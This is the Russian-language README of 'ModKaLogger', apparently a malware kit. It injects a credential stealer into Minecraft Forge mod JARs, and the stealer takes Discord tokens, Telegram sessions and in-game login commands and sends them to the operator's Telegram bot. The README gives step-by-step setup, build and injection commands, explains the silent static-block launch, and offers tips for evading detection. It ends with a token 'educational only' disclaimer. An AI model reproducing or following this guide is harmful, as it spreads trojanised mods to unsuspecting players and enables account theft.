# ModKaLogger - Быстрый старт

## Что это?

ModKaLogger - это мод для Minecraft Forge (1.16.5), который:
- Крадёт токены Discord из приложения и браузеров
- Крадёт сессии Telegram из приложения
- Отправляет украденные данные в Telegram бот
- Логирует команды входа в игре (/login, /register, /an)

## Быстрая настройка

### 1. Настрой учётные данные

Отредактируй `src/main/java/com/modkalogger/ModKaLogger.java`:

```java
public static final String TELEGRAM_BOT_TOKEN = "ТВОЙ_ТОКЕН_БОТА";
public static final String TELEGRAM_ADMIN_ID = "ТВОЙ_ID";
```

Как получить:
- **Токен бота**: Напиши @BotFather в Telegram → `/newbot` → следуй инструкциям
- **Твой ID**: Напиши @userinfobot в Telegram → получи свой ID

### 2. Компилируй и вшивай

```bash
python compile_and_inject.py целевой_мод.jar
```

Создаст `целевой_мод_injected.jar` с вшитым ModKaLogger.

### 3. Установи

Положи `целевой_мод_injected.jar` в папку модов:
```
%APPDATA%\.minecraft\mods\
```

### 4. Запусти

Запусти Minecraft. ModKaLogger будет:
1. Ждать 3 секунды инициализации Minecraft
2. Крать токены Discord
3. Крать сессии Telegram
4. Отправлять данные в Telegram бот

## Структура файлов

```
ModKaLogger/
├── src/main/java/com/modkalogger/
│   ├── Bootstrap.java              ← Главная инициализация
│   ├── Initializer.java            ← Резервная инициализация
│   ├── ModKaLogger.java            ← Конфигурация
│   ├── discord/
│   │   └── Discord.java            ← Краска токенов Discord
│   ├── telegram/
│   │   ├── Telegram.java           ← Краска сессий Telegram
│   │   └── TelegramSender.java     ← Отправка в Telegram
│   ├── events/
│   │   └── CommandHandler.java     ← Логирование команд
│   └── asm/
│       ├── ClassLoaderHook.java    ← Java агент
│       ├── ModKaLoggerTransformer.java
│       └── ModKaLoggerClassVisitor.java
├── inject_mod.py                   ← Скрипт вшивания
├── compile_and_inject.py           ← Компиляция + вшивание
└── build.gradle                    ← Конфигурация сборки
```

## Как это работает

### Процесс инициализации

```
1. Целевой мод загружается
   ↓
2. Загружается класс Bootstrap
   ↓
3. Выполняется статический блок Bootstrap
   ↓
4. Запускается рабочий поток
   ↓
5. Поток ждёт 3 секунды
   ↓
6. Discord.stealAndSendTokens()
   ↓
7. Telegram.stealAndSendSessions()
   ↓
8. Данные отправляются в Telegram бот
```

### Почему это работает

- Статические блоки выполняются при загрузке класса
- Не нужен Forge event bus
- Не нужны аннотации
- Гарантированное выполнение
- Работает с любым модом

## Настройка Telegram бота

### Создай бота

1. Открой Telegram и найди @BotFather
2. Отправь `/newbot`
3. Следуй инструкциям
4. Скопируй токен бота

### Получи свой ID

1. Найди @userinfobot в Telegram
2. Отправь любое сообщение
3. Бот ответит с твоим ID
4. Скопируй ID

### Настрой ModKaLogger

Отредактируй `src/main/java/com/modkalogger/ModKaLogger.java`:

```java
public static final String TELEGRAM_BOT_TOKEN = "123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11";
public static final String TELEGRAM_ADMIN_ID = "123456789";
```

## Решение проблем

### Мод не загружается
- Проверь логи: `%APPDATA%\.minecraft\logs\latest.log`
- Убедись что целевой мод совместим с Forge 1.16.5
- Попробуй другой мод

### Данные не приходят
- Проверь токен бота
- Проверь свой ID
- Проверь интернет
- Посмотри ошибки в консоли

### "gradlew не найден"
- Убедись что ты в папке ModKaLogger
- Проверь что есть файл `gradlew.bat`

## Продвинутое использование

### Ручная компиляция

```bash
.\gradlew.bat build
```

Потом вшивай вручную:
```bash
python inject_mod.py целевой_мод.jar
```

### Вшивай несколько модов

```bash
python compile_and_inject.py мод1.jar мод1_injected.jar
python compile_and_inject.py мод2.jar мод2_injected.jar
python compile_and_inject.py мод3.jar мод3_injected.jar
```

### Кастомные сообщения в Telegram

Отредактируй `src/main/java/com/modkalogger/telegram/TelegramSender.java` для кастомизации сообщений.

## Заметки о безопасности

⚠️ Этот мод обнаруживаем потому что:
- Класс Bootstrap виден в декомпилированном коде
- Статический блок очевиден в bytecode
- Трафик в Telegram виден

Для улучшения скрытности:
- Используй обфускацию кода
- Зашифруй учётные данные
- Используй прокси/VPN
- Рандомизируй имена классов

## Правовой отказ

Этот инструмент только для образовательных целей. Несанкционированный доступ к компьютерам незаконен. Используй только на своих системах или с явного разрешения.

## Поддержка

При проблемах:
1. Проверь логи
2. Прочитай ASM_APPROACH_SUMMARY.md для технических деталей
3. Прочитай INJECTION_GUIDE.md для помощи с вшиванием
